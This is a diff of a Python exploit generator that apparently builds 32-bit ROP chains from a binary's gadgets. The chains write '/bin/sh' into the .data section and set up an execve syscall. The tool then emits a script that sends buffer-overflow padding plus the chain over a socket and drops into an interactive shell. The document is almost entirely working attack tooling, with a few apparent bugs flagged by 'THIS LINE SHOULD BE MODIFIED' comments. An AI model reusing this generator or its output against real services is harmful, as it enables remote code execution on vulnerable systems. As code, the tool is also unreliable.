@@ -1,29 +1,33 @@
 #!/usr/bin/env python
 from RopChainer import *
+from util import *
 
 class ScriptMaker(object):
     tab = " " * 4 # set tab
 
-    def __init__(self, gadget):
+    def __init__(self, gadget, pop_level=0):
         self.__Gadget = gadget
         self.__gadgets = self.__Gadget.getGadgets()
         self.chainer = RopChainer(self.__gadgets)
-        self.prepare_script()
         self.prepare_gadgets()
+        self.pop_level = pop_level
 
-    def prepare_script(self):
-        self.Header  = "#!/usr/bin/env python" + "\n"
-        self.Header += "from util import *" + "\n"
-        self.Header += "import socket" + "\n"
-        #self.Header += "import sys" + "\n"
-        self.Header += "\n"
-        self.Header += "bin = pStr(\"/bin\") "+ "\n"
-        self.Header += "sh  = pStr(\"/sh\") "+ "\n"
+    def prepareHeader(self):
+        Header  = "#!/usr/bin/env python" + "\n"
+        Header += "from util import *" + "\n"
+        Header += "import socket" + "\n"
+        Header += "import sys" + "\n"
+        Header += "\n"
+        #Header += "bin = pStr(\"/bin\") "+ "\n"
+        #Header += "sh  = pStr(\"/sh\") "+ "\n"
 
-        self.Header += "padding  = \"A\" * 91" + "\n"
-        self.Header += "padding += p32(bin) + p32(sh)" + "\n"
-        self.Header += "\n"
-        self.Header += "\n"
+        #Header += "padding  = \"A\" * 91" + "\n"
+        Header += "padding  = \"A\" * 99" + "\n"
+        #Header += "padding += p32(bin) + p32(sh)" + "\n"
+        Header += "\n"
+        Header += "\n"
+
+        return Header
 
     def prepare_gadgets(self):
         # get all single pop eax ebx ecx edx
@@ -31,6 +35,8 @@ class ScriptMaker(object):
         self.pop_ebx = self.chainer.searchSingleGadgets("pop ebx")
         self.pop_ecx = self.chainer.searchSingleGadgets("pop ecx")
         self.pop_edx = self.chainer.searchSingleGadgets("pop edx")
+        self.pop_esi = self.chainer.searchSingleGadgets("pop esi")
+        self.pop_edi = self.chainer.searchSingleGadgets("pop edi")
 
         # get all single xor eax ebx ecx edx
         self.xor_eax = self.chainer.searchSingleGadgets("xor eax")
@@ -52,58 +58,158 @@ class ScriptMaker(object):
         # get syscall gadgets
         self.syscall = self.chainer.searchSyscall()
 
-    def multiPopChain(self, main_pop=0):
-        pops = self.multi_pop[main_pop]
-        #set register value
-        rets = {
-                "eax" : 0xb,
-                "ebx" : 0xf6ffee64,
-                "ecx" : 0x0,
-                "edx" : 0x0
-                }
-        curReg = {
-                "eax" : -1,
-                "ebx" : -1,
-                "ecx" : -1,
-                "edx" : -1
-                }
-        sort = [{"vaddr": pops["vaddr"], "value": []}]
-        codes = pops["gadgets"].split(" ; ")[:-1]
-        for code in codes:
-            code = code.split()[1]
-            if curReg[code]!=rets[code]:
-                curReg[code] = rets[code]
-                sort[0]["value"].append(rets[code])
+    def make_rop_chain(self, pop_level=0):
+        if pop_level >= len(self.multi_pop) or pop_level<0:
+            pop_level = 0
 
         single_pops = {"eax" : self.pop_eax[0]["vaddr"],
                        "ebx" : self.pop_ebx[0]["vaddr"],
                        "ecx" : self.pop_ecx[0]["vaddr"],
-                       "edx" : self.pop_edx[0]["vaddr"]}
-        for reg in curReg.keys():
-            if curReg[reg]!=rets[reg]:
-                sort.append({"vaddr": single_pops[reg], "value":[rets[reg]]})
-        return sort
+                       "edx" : self.pop_edx[1]["vaddr"]}        # THIS LINE SHOULD BE MODIFIED
+        # Find .data section and write /bin/sh
+        writeAddr = None
+        for section in self.__Gadget.getDataSections():
+            if section["name"] == ".data":
+                writeAddr = section["vaddr"]
+                break
 
-    def prepare_chain(self, **keys):
-        self.chain = "chain  = \"\"" + "\n"
-        chainer = self.multiPopChain(0)
-        for gadget in chainer:
-            self.chain += "chain += " + self.prepare_func("p32", gadget["vaddr"]) + "\n"
+        if writeAddr is None:
+            return []
+
+        for shell in self.chainer.searchShellGadgets():
+            gadget, dstReg, srcReg = shell
+
+            chain = []
+            curReg = {
+                    "eax": -1,
+                    "ebx": -1,
+                    "ecx": -1,
+                    "edx": -1
+                    }
+
+            expReg = {
+                    "eax": 0xb,
+                    "ebx": writeAddr,
+                    "ecx": 0,
+                    "edx": 0
+                    }
+
+            if dstReg == "eax" and self.pop_eax:
+                worker = self.pop_eax[0]
+            elif dstReg == "ebx" and self.pop_ebx:
+                worker = self.pop_ebx[0]
+            elif dstReg == "ecx" and self.pop_ecx:
+                worker = self.pop_ecx[0]
+            elif dstReg == "edx" and self.pop_edx:
+                worker = self.pop_edx[1]            # THIS LINE SHOULD BE MODIFIED
+            elif dstReg == "esi" and self.pop_esi:
+                worker = self.pop_esi[0]
+            elif dstReg == "edi" and self.pop_edi:
+                worker = self.pop_edi[0]
+            else:
+                continue
+
+            if srcReg == "eax" and self.pop_eax:
+                mover = self.pop_eax[0]
+            elif srcReg == "ebx" and self.pop_ebx:
+                mover = self.pop_ebx[0]
+            elif srcReg == "ecx" and self.pop_ecx:
+                mover = self.pop_ecx[0]
+            elif srcReg == "edx" and self.pop_edx:
+                mover = self.pop_edx[0]
+            elif srcReg == "esi" and self.pop_esi:
+                mover = self.pop_esi[0]
+            elif srcReg == "edi" and self.pop_edi:
+                mover = self.pop_edi
+            else:
+                continue
+
+            for pops in self.multi_pop[pop_level:]:
+                # put /bin
+                chain.append({
+                    "vaddr": mover["vaddr"],
+                    "value": [pStr("/bin")]
+                    })
+
+
+                chain.append({
+                    "vaddr": worker["vaddr"],
+                    "value": [writeAddr]
+                    })
+                chain.append({
+                    "vaddr": gadget["vaddr"],
+                    "value": []
+                    })
+                # put /sh
+                chain.append({
+                    "vaddr": mover["vaddr"],
+                    "value": [pStr("/sh")]
+                    })
+                chain.append({
+                    "vaddr": worker["vaddr"],
+                    "value": [writeAddr+4]
+                    })
+                chain.append({
+                    "vaddr": gadget["vaddr"],
+                    "value": []
+                    })
+
+                chain.append({
+                    "vaddr": single_pops["ebx"],
+                    "value": [writeAddr]
+                    })
+
+                codes = pops["gadgets"].split(" ; ")[:-1]
+                value = []
+
+                for code in codes:
+                    reg = code.split()[1]
+                    value.append(expReg[reg])
+                    curReg[reg] = expReg[reg]
+                chain.append({
+                    "vaddr": pops["vaddr"],
+                    "value": value
+                    })
+
+                for reg in curReg.keys():
+                    if curReg[reg]!=expReg[reg]:
+                        chain.append({
+                            "vaddr": single_pops[reg],
+                            "value": [expReg[reg]]
+                            })
+
+                with open("chain", "w") as f:
+                    for c in chain:
+                        f.write("chain = 0x%08x\n" % c["vaddr"])
+                        f.write("value = %s\n" % c["value"])
+                return chain
+        return []
+
+    def prepareChain(self, pop_level=0):
+        chain = "chain  = \"\"" + "\n"
+        rop_chain = self.make_rop_chain(pop_level)
+        for gadget in rop_chain:
+            chain += "chain += " + self.prepare_func("p32", gadget["vaddr"]) + "\n"
             for arg in gadget["value"]:
-                self.chain += "chain += " + self.prepare_func("p32", arg) + "\n"
+                chain += "chain += " + self.prepare_func("p32", arg) + "\n"
         sysgadget = self.syscall[0]
-        self.chain += "chain += " + self.prepare_func("p32", sysgadget["vaddr"]) + "\n"
+        chain += "chain += " + self.prepare_func("p32", sysgadget["vaddr"]) + "\n"
+
+        return chain
 
     def prepare_func(self, name, arg):
         return name + "(" + str(arg) +  ")"
 
     def make_script(self):
-        self.exploit = self.Header
-        self.exploit += self.chain
+        self.exploit = self.prepareHeader()
+        self.exploit += self.prepareChain(self.pop_level)
         self.exploit += "\n"
         self.exploit += "payload = padding + chain" + "\n"
         self.exploit += "r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n"
         self.exploit += "r.connect((\"0.0.0.0\", 4000))" + "\n"
+
+        self.exploit += "raw_input()" + "\n" # this line use to debug
+
         self.exploit += "r.send(payload+\"\\n\")" + "\n"
         self.exploit += "r.settimeout(0.1)" + "\n"
         self.exploit += "shHead = \"$ \"" + "\n"
@@ -124,7 +230,7 @@ class ScriptMaker(object):
         self.exploit += self.tab*2 + "if not response:" + "\n"
         self.exploit += self.tab*3 + "continue" + "\n"
         self.exploit += self.tab*2 + "print response" + "\n"
-        self.exploit += self.tab*1 + "except EOFError:" + "\n"
+        self.exploit += self.tab*1 + "except EOFError, KeyboardInterrupt:" + "\n"
         self.exploit += self.tab*2 + "print" + "\n"
         self.exploit += self.tab*2 + "print \"[+] Get EOF\"" + "\n"
         self.exploit += self.tab*2 + "break" + "\n"
